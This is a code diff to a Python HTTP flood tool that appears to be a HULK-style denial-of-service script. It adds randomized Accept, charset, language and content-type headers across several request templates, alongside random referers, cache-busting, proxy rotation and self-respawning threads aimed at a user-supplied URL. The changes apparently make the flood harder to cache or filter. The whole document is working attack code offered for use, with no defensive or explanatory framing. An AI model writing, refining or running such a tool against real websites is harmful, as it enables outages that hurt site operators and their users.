@@ -88,10 +88,14 @@ def referer_list():
 
 def buildblock(size):
     out_str = ""
-    for i in range(size):
+    for _ in range(size):
         out_str += random.choice(string.ascii_letters)
     return out_str
 
+langcode = ["aa","ab","af","ak","sq","am","ar","an","hy","as","av","ae","ay","az","ba","bm","eu","be","bn","bh","bi","bs","br","bg","my","ca","ch","ce","zh","zh-CN","zh-TW","cu","cv","kw","co","cr","cs","da","dv","nl","dz","en","en-US","en-GB","en-CA","en-AU","eo","et","ee","fo","fj","fi","fr","fr-CA","fy","ff","ka","de","gd","ga","gl","gv","el","gn","gu","ht","ha","he","hz","hi","ho","hu","ig","is","io","ii","iu","ie","ia","id","ik","it","jv","ja","kl","kn","ks","kr","kk","km","ki","rw","ky","kv","kg","ko","kj","ku","lo","la","lv","li","ln","lt","lb","lu","lg","mk","mh"]
+def lang():
+    global langcode
+    return random.choice(langcode)
 if(config["useconfigurl"] == False):
     url = []
     url.append(input("                            URL:"))
@@ -154,24 +158,71 @@ class httpcall(threading.Thread):
                     proxy = ""
                     if self.useproxies == True:
                         proxy = proxies.pop(0)
-
                     if useurl.count("?") > 0:
                         param_joiner = "&"
                     else:
                         param_joiner = "?"
                 except IndexError:
                     continue
-                tmp = {
+                langcodea = lang()
+                contenttypes = ["text/html","text/plain","application/json","text/csv","application/pdf","application/zip","application/xslm","text/css"]
+                accepts = [f"text/html,{random.choice(contenttypes)},{random.choice(contenttypes)},{random.choice(contenttypes)};q=0.{random.randint(4,9)}",f"*/*;q=0.{random.randint(4,9)}","*/*"]
+                acceptcharset = ["ISO-8859-1","shift-jis","US-ASCII","utf-8"]
+                tmp = []
+                tmp.append({
+                    "Accept":random.choice(accepts),
                     "User-Agent": random.choice(self.useragents),
                     "Cache-Control": "no-cache",
-                    "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-                    "content-type": "application/json",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                     "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                     "Keep-Alive": str(random.randint(110,120)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                     "Connection": "keep-alive",
                     "Host": usehost
-                }
-                header = deepmerge(tmp,self.head)
+                })
+                tmp.append({
+                    "Accept": random.choice(accepts),
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
+                    "content-type": random.choice(contenttypes),#
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Keep-Alive": str(random.randint(110,120)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
+                    "Connection": "keep-alive",
+                    "Host": usehost
+                })
+                tmp.append({
+                    "Accept": random.choice(accepts),
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
+                    "content-type": random.choice(contenttypes),#
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Keep-Alive": str(random.randint(110,120)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
+                    "Connection": "keep-alive"
+                })
+                tmp.append({
+                    "Accept": random.choice(accepts),
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
+                    "content-type": random.choice(contenttypes),#
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
+                    "Host": usehost
+                })
+                tmp.append({
+                    "Accept": random.choice(accepts),
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
+                    "content-type": random.choice(contenttypes),#
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}"
+                })
+                header = deepmerge(random.choice(tmp),self.head)
                 if proxy == "":
                     try:
                         if self.usepayload == True:
@@ -250,6 +301,7 @@ class httpcall(threading.Thread):
                 time.sleep(self.normaldelay / 1000)
             else:
                 pass
+        time.sleep(1)
         httpcall().start()
         return
 
